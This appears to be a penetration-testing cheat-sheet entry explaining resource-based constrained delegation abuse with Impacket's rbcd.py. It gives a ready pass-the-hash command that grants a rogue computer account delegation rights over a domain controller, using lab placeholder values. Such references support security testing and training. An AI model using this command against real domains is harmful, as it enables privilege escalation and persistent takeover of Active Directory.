---
description: |
  Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security descriptor of another computer.
  The following command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of DC01.
  This basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using getST.py.

  Command Reference:

    Target IP: 10.10.10.1

    Domain: test.local

    Username: john

    Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA

    Delegate To: DC01$

    Delegate From: EVILCOMPUTER$

command: |
  python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
items:
  - Username
  - Hash
services:
  - Kerberos
  - SMB
  - LDAP
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - PrivEsc
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py
  - https://github.com/tothi/rbcd-attack
---
